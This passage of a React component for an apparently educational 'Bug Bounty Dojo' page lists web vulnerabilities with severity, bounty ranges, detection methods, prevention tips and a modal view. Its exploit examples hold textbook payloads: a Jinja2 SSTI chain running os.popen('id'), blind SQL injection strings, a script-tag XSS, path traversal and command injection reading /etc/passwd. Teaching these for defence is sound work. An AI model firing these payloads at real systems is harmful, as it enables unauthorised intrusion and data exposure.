      detectionMethods: [
        "XPath syntax testing",
        "Boolean logic testing",
        "Error message analysis",
        "Data extraction testing"
      ],
      exploitExamples: [
        { payload: "' or '1'='1", context: "Authentication bypass" },
        { payload: "XPath function injection", context: "Data extraction" }
      ],
      prevention: [
        "Input validation",
        "Parameterized queries",
        "Escape sequences",
        "Least privilege"
      ]
    },
    {
      id: 42,
      name: "HTTP Response Splitting",
      category: "Protocol",
      severity: "Medium",
      cvssScore: 5.8,
      bountyRange: "$200 - $2,000",
      frequency: "0.1%",
      description: "Injecting HTTP headers to split responses",
      impact: "Cache poisoning, XSS, session hijacking",
      types: ["CRLF injection", "Header injection"],
      detectionMethods: [
        "CRLF character testing",
        "Header manipulation",
        "Response analysis",
        "Cache behavior testing"
      ],
      exploitExamples: [
        { payload: "\\r\\nSet-Cookie: admin=true", context: "Cookie injection" },
        { payload: "HTTP response splitting", context: "Cache poisoning" }
      ],
      prevention: [
        "Input validation",
        "Header sanitization",
        "Output encoding",
        "Framework updates"
      ]
    },
    {
      id: 43,
      name: "Server-Side Template Injection (SSTI)",
      category: "Injection",
      severity: "Critical",
      cvssScore: 9.0,
      bountyRange: "$1,500 - $20,000",
      frequency: "0.1%",
      description: "Injecting template syntax to execute server-side code",
      impact: "Remote code execution, file system access",
      types: ["Jinja2 injection", "Twig injection", "Smarty injection"],
      detectionMethods: [
        "Template syntax testing",
        "Expression evaluation",
        "Error message analysis",
        "Code execution testing"
      ],
      exploitExamples: [
        { payload: "{{7*7}}", context: "Basic template injection" },
        { payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", context: "RCE via SSTI" }
      ],
      prevention: [
        "Input validation",
        "Sandboxed templates",
        "Logic-less templates",
        "Template engine updates"
      ]
    },
    {
      id: 44,
      name: "Blind SQL Injection",
      category: "Injection",
      severity: "High",
      cvssScore: 7.8,
      bountyRange: "$800 - $12,000",
      frequency: "0.1%",
      description: "SQL injection without direct output",
      impact: "Data extraction, database enumeration",
      types: ["Boolean-based blind", "Time-based blind"],
      detectionMethods: [
        "Boolean logic testing",
        "Time delay testing",
        "Error message analysis",
        "Response comparison"
      ],
      exploitExamples: [
        { payload: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--", context: "Boolean-based" },
        { payload: "'; WAITFOR DELAY '00:00:05'--", context: "Time-based" }
      ],
      prevention: [
        "Parameterized queries",
        "Input validation",
        "Error handling",
        "Database hardening"
      ]
    },
    {
      id: 45,
      name: "DOM-based XSS",
      category: "Web Application",
      severity: "Medium",
      cvssScore: 6.3,
      bountyRange: "$200 - $3,000",
      frequency: "0.1%",
      description: "XSS vulnerabilities in client-side DOM manipulation",
      impact: "Session hijacking, credential theft, malware",
      types: ["Source-based DOM XSS", "Sink-based DOM XSS"],
      detectionMethods: [
        "DOM source analysis",
        "JavaScript debugging",
        "URL fragment testing",
        "Client-side payload testing"
      ],
      exploitExamples: [
        { payload: "#<script>alert('XSS')</script>", context: "URL fragment XSS" },
        { payload: "DOM manipulation payload", context: "JavaScript injection" }
      ],
      prevention: [
        "Input validation",
        "Output encoding",
        "Safe DOM APIs",
        "CSP implementation"
      ]
    },
    {
      id: 46,
      name: "Path Traversal",
      category: "File System",
      severity: "High",
      cvssScore: 7.4,
      bountyRange: "$400 - $6,000",
      frequency: "0.1%",
      description: "Accessing files outside intended directory",
      impact: "File disclosure, configuration access, code review",
      types: ["Basic path traversal", "Null byte injection", "Encoding bypass"],
      detectionMethods: [
        "Directory traversal testing",
        "File path manipulation",
        "Encoding bypass testing",
        "Null byte testing"
      ],
      exploitExamples: [
        { payload: "../../../etc/passwd", context: "Unix file access" },
        { payload: "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", context: "Windows file access" }
      ],
      prevention: [
        "Input validation",
        "Path canonicalization",
        "Chroot jails",
        "File system permissions"
      ]
    },
    {
      id: 47,
      name: "Command Injection",
      category: "Injection",
      severity: "Critical",
      cvssScore: 9.1,
      bountyRange: "$2,000 - $30,000",
      frequency: "0.1%",
      description: "Executing arbitrary system commands",
      impact: "System compromise, data theft, malware installation",
      types: ["Direct command injection", "Blind command injection"],
      detectionMethods: [
        "Command separator testing",
        "System command testing",
        "Time delay testing",
        "Output analysis"
      ],
      exploitExamples: [
        { payload: "; cat /etc/passwd", context: "Unix command injection" },
        { payload: "& type C:\\windows\\system32\\drivers\\etc\\hosts", context: "Windows command injection" }
      ],
      prevention: [
        "Input validation",
        "Command whitelisting",
        "Parameterized commands",
        "Sandboxing"
      ]
    },
    {
      id: 48,
      name: "Broken Access Control",
      category: "Authorization",
      severity: "High",
      cvssScore: 7.7,
      bountyRange: "$500 - $8,000",
      frequency: "0.1%",
      description: "Inadequate access control enforcement",
      impact: "Unauthorized access, data breach, privilege escalation",
      types: ["Missing access control", "Inconsistent enforcement", "Privilege escalation"],
      detectionMethods: [
        "Access control testing",
        "Role manipulation",
        "URL manipulation",
        "Parameter tampering"
      ],
      exploitExamples: [
        { payload: "Direct URL access to admin panel", context: "Missing access control" },
        { payload: "Parameter manipulation for privilege escalation", context: "Broken authorization" }
      ],
      prevention: [
        "Proper access controls",
        "Consistent enforcement",
        "Regular audits",
        "Principle of least privilege"
      ]
    },
    {
      id: 49,
      name: "Cryptographic Failures",
      category: "Cryptography",
      severity: "High",
      cvssScore: 7.6,
      bountyRange: "$400 - $7,000",
      frequency: "0.1%",
      description: "Failures in cryptographic implementation",
      impact: "Data exposure, authentication bypass, integrity loss",
      types: ["Weak encryption", "Poor key management", "Implementation flaws"],
      detectionMethods: [
        "Cryptographic analysis",
        "Key strength testing",
        "Algorithm identification",
        "Implementation review"
      ],
      exploitExamples: [
        { payload: "Weak encryption algorithm exploitation", context: "Data decryption" },
        { payload: "Poor random number generation", context: "Predictable keys" }
      ],
      prevention: [
        "Strong cryptography",
        "Proper key management",
        "Regular updates",
        "Security reviews"
      ]
    },
    {
      id: 50,
      name: "Memory Corruption",
      category: "Memory Safety",
      severity: "Critical",
      cvssScore: 9.8,
      bountyRange: "$5,000 - $50,000",
      frequency: "0.1%",
      description: "Buffer overflows and memory safety issues",
      impact: "Remote code execution, denial of service, privilege escalation",
      types: ["Buffer overflow", "Use-after-free", "Double-free", "Format string bugs"],
      detectionMethods: [
        "Fuzzing",
        "Static analysis",
        "Dynamic analysis",
        "Memory debugging"
      ],
      exploitExamples: [
        { payload: "Buffer overflow payload", context: "Stack overflow" },
        { payload: "Heap corruption exploit", context: "Heap overflow" }
      ],
      prevention: [
        "Memory-safe languages",
        "Bounds checking",
        "Stack canaries",
        "ASLR/DEP"
      ]
    }
  ];

  const categories = ["all", "Web Application", "Injection", "Authentication", "Authorization", "Network", "Cryptography", "Logic", "Memory Safety", "Information Exposure", "UI Redressing", "DNS", "Protocol", "Code Execution", "File Inclusion", "Session Management", "API Security", "File Handling", "JavaScript", "File System"];
  const severities = ["all", "Critical", "High", "Medium", "Low"];

  // Filter vulnerabilities
  const filteredVulnerabilities = vulnerabilities.filter(vuln => {
    const matchesSearch = vuln.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
                         vuln.description.toLowerCase().includes(searchTerm.toLowerCase());
    const matchesCategory = selectedCategory === 'all' || vuln.category === selectedCategory;
    const matchesSeverity = selectedSeverity === 'all' || vuln.severity === selectedSeverity;
    return matchesSearch && matchesCategory && matchesSeverity;
  });

  const getSeverityColor = (severity) => {
    switch (severity) {
      case 'Critical': return 'text-red-500 bg-red-500/20 border-red-500';
      case 'High': return 'text-orange-500 bg-orange-500/20 border-orange-500';
      case 'Medium': return 'text-yellow-500 bg-yellow-500/20 border-yellow-500';
      case 'Low': return 'text-blue-500 bg-blue-500/20 border-blue-500';
      default: return 'text-gray-500 bg-gray-500/20 border-gray-500';
    }
  };

  const openModal = (vulnerability) => {
    setSelectedVulnerability(vulnerability);
    setShowModal(true);
  };

  const closeModal = () => {
    setShowModal(false);
    setSelectedVulnerability(null);
  };

  return (
    <div className="min-h-screen bg-cyber-darker text-cyber-orange">
      {/* Header */}
      <div className="relative h-80 bg-gradient-to-b from-cyber-orange/20 via-cyber-red/10 to-cyber-darker overflow-hidden">
        <div className="absolute inset-0">
          <div className="cyber-grid-bg h-full opacity-20 animate-pulse"></div>
        </div>
        <div className="relative z-10 flex items-center justify-center h-full">
          <div className="text-center max-w-4xl mx-auto px-4">
            <div className="flex justify-center mb-6">
              <div className="w-20 h-20 rounded-full bg-gradient-to-br from-cyber-orange to-cyber-red flex items-center justify-center animate-bounce">
                <Bug className="w-10 h-10 text-white" />
              </div>
            </div>
            <h1 className="text-6xl font-cyber font-bold text-cyber-orange mb-6 animate-glow">
              🐛 BUG BOUNTY DOJO
            </h1>
            <p className="text-2xl text-cyber-red mb-4">
              Master the Art of Ethical Hacking
            </p>
            <p className="text-lg text-gray-300 max-w-3xl mx-auto">
              Comprehensive vulnerability database with real-world exploitation techniques, 
              detection methods, and prevention strategies for bug bounty hunters
            </p>
            
            {/* Stats */}
            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mt-8">
              <div className="bg-cyber-dark/60 rounded-lg p-4 border border-cyber-orange/30">
                <div className="text-2xl font-bold text-cyber-orange">50</div>
                <div className="text-sm text-gray-400">Top Vulnerabilities</div>
              </div>
              <div className="bg-cyber-dark/60 rounded-lg p-4 border border-cyber-red/30">
                <div className="text-2xl font-bold text-cyber-red">$50K+</div>
                <div className="text-sm text-gray-400">Max Bounty</div>
              </div>
              <div className="bg-cyber-dark/60 rounded-lg p-4 border border-cyber-green/30">
                <div className="text-2xl font-bold text-cyber-green">20</div>
                <div className="text-sm text-gray-400">Categories</div>
              </div>
              <div className="bg-cyber-dark/60 rounded-lg p-4 border border-cyber-blue/30">
                <div className="text-2xl font-bold text-cyber-blue">100%</div>
                <div className="text-sm text-gray-400">Real World</div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 py-8">
        {/* Search and Filter Controls */}
        <div className="cyber-card mb-8">
          <div className="flex flex-col md:flex-row gap-4">
            <div className="relative flex-1">
              <Search className="w-5 h-5 absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" />
              <input
                type="text"
                placeholder="Search vulnerabilities..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pl-10 pr-4 py-3 bg-cyber-gray/30 border border-cyber-gray rounded-lg focus:border-cyber-orange outline-none text-white"
              />
            </div>
            
            <select
              value={selectedCategory}
              onChange={(e) => setSelectedCategory(e.target.value)}
              className="px-4 py-3 bg-cyber-gray/30 border border-cyber-gray rounded-lg focus:border-cyber-orange outline-none text-white"
            >
              {categories.map(cat => (
                <option key={cat} value={cat} className="bg-cyber-darker">
                  {cat === 'all' ? 'All Categories' : cat}
                </option>
              ))}
            </select>
            
            <select
              value={selectedSeverity}
              onChange={(e) => setSelectedSeverity(e.target.value)}
              className="px-4 py-3 bg-cyber-gray/30 border border-cyber-gray rounded-lg focus:border-cyber-orange outline-none text-white"
            >
              {severities.map(sev => (
                <option key={sev} value={sev} className="bg-cyber-darker">
                  {sev === 'all' ? 'All Severities' : sev}
                </option>
              ))}
            </select>
          </div>
        </div>

        {/* Vulnerability Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
          {filteredVulnerabilities.map((vuln) => (
            <div 
              key={vuln.id}
              className="cyber-card hover:border-cyber-orange/60 cursor-pointer transition-all group hover:scale-105"
              onClick={() => openModal(vuln)}
            >
              <div className="flex items-start justify-between mb-4">
                <div className="flex-1">
                  <h3 className="text-lg font-semibold mb-2 group-hover:text-cyber-orange transition-colors">
                    {vuln.name}
                  </h3>
                  <p className="text-gray-400 text-sm mb-3 line-clamp-2">{vuln.description}</p>
                </div>
              </div>
              
              <div className="flex items-center justify-between mb-4">
                <div className={`px-3 py-1 rounded-full text-xs font-semibold border ${getSeverityColor(vuln.severity)}`}>
                  {vuln.severity}
                </div>
                <div className="text-cyber-green font-semibold text-sm">
                  {vuln.bountyRange}
                </div>
              </div>
              
              <div className="grid grid-cols-2 gap-4 text-sm mb-4">
                <div>
                  <span className="text-gray-400">CVSS:</span>
                  <span className="ml-2 font-semibold">{vuln.cvssScore}</span>
                </div>
                <div>
                  <span className="text-gray-400">Freq:</span>
                  <span className="ml-2 font-semibold">{vuln.frequency}</span>
                </div>
              </div>
              
              <div className="flex items-center justify-between">
                <span className="bg-cyber-purple/20 text-cyber-purple px-2 py-1 rounded text-xs">
                  {vuln.category}
                </span>
                <span className="text-xs text-gray-400 flex items-center">
                  <Eye className="w-3 h-3 mr-1" />
                  View Details
                </span>
              </div>
            </div>
          ))}
        </div>
        
                {filteredVulnerabilities.length === 0 && (
          <div className="text-center py-12">
            <AlertTriangle className="w-16 h-16 mx-auto mb-4 text-cyber-orange opacity-50" />
            <h3 className="text-xl font-bold mb-2">No vulnerabilities found</h3>
            <p className="text-gray-400">Try adjusting your search criteria</p>
          </div>
        )}
      </div>

      {/* Modal */}
      {showModal && selectedVulnerability && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-50 p-4">
          <div className="bg-cyber-darker border border-cyber-orange rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto">
            {/* Modal Header */}
            <div className="flex items-center justify-between p-6 border-b border-cyber-gray/30">
              <div className="flex items-center space-x-4">
                <h2 className="text-2xl font-cyber font-bold text-cyber-orange">
                  {selectedVulnerability.name}
                </h2>
                <div className={`px-3 py-1 rounded-full text-xs font-semibold border ${getSeverityColor(selectedVulnerability.severity)}`}>
                  {selectedVulnerability.severity}
                </div>
              </div>
              <button 
                onClick={closeModal}
                className="p-2 hover:bg-cyber-gray/30 rounded-lg transition-colors"
              >
                <X className="w-6 h-6 text-gray-400 hover:text-white" />
              </button>
            </div>

            {/* Modal Content */}
            <div className="p-6 space-y-6">
              {/* Overview */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div className="md:col-span-2">
                  <h3 className="font-semibold text-cyber-blue mb-2">Description:</h3>
                  <p className="text-gray-300">{selectedVulnerability.description}</p>
                </div>
                <div className="space-y-4">
                  <div>
                    <span className="text-gray-400">CVSS Score:</span>
                    <span className="ml-2 font-semibold text-cyber-yellow">{selectedVulnerability.cvssScore}</span>
                  </div>
                  <div>
                    <span className="text-gray-400">Bounty Range:</span>
                    <span className="ml-2 font-semibold text-cyber-green">{selectedVulnerability.bountyRange}</span>
                  </div>
                  <div>
                    <span className="text-gray-400">Frequency:</span>
                    <span className="ml-2 font-semibold">{selectedVulnerability.frequency}</span>
                  </div>
                </div>
              </div>

              {/* Impact */}
              <div>
                <h3 className="font-semibold text-cyber-red mb-2">Impact:</h3>
                <p className="text-gray-300">{selectedVulnerability.impact}</p>
              </div>

              {/* Types */}
              {selectedVulnerability.types && (
                <div>
                  <h3 className="font-semibold text-cyber-green mb-2">Types:</h3>
                  <div className="flex flex-wrap gap-2">
                    {selectedVulnerability.types.map((type, index) => (
                      <span key={index} className="bg-cyber-green/20 text-cyber-green px-3 py-1 rounded text-sm">
                        {type}
                      </span>
                    ))}
                  </div>
                </div>
              )}

              {/* Detection Methods */}
              {selectedVulnerability.detectionMethods && (
                <div>
                  <h3 className="font-semibold text-cyber-yellow mb-2">Detection Methods:</h3>
                  <ul className="space-y-2">
                    {selectedVulnerability.detectionMethods.map((method, index) => (
                      <li key={index} className="text-gray-300 flex items-start">
                        <span className="text-cyber-yellow mr-2 mt-1">•</span>
                        {method}
                      </li>
                    ))}
                  </ul>
                </div>
              )}

              {/* Exploit Examples */}
              {selectedVulnerability.exploitExamples && (
                <div>
                  <h3 className="font-semibold text-cyber-red mb-2">Exploit Examples:</h3>
                  <div className="space-y-3">
                    {selectedVulnerability.exploitExamples.map((example, index) => (
                      <div key={index} className="bg-cyber-gray/20 p-4 rounded-lg">
                        <div className="mb-2">
                          <span className="text-xs text-gray-400">{example.context}</span>
                        </div>
                        <code className="text-cyber-red font-mono text-sm bg-black/50 p-2 rounded block overflow-x-auto">
                          {example.payload}
                        </code>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Prevention */}
              {selectedVulnerability.prevention && (
                <div>
                  <h3 className="font-semibold text-cyber-pink mb-2">Prevention:</h3>
                  <ul className="space-y-2">
                    {selectedVulnerability.prevention.map((method, index) => (
                      <li key={index} className="text-gray-300 flex items-start">
                        <span className="text-cyber-pink mr-2 mt-1">•</span>
                        {method}
                      </li>
                    ))}
                  </ul>
                </div>
              )}
            </div>

            {/* Modal Footer */}
            <div className="flex justify-end p-6 border-t border-cyber-gray/30">
              <button 
                onClick={closeModal}
                className="cyber-button"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default BugBounty;

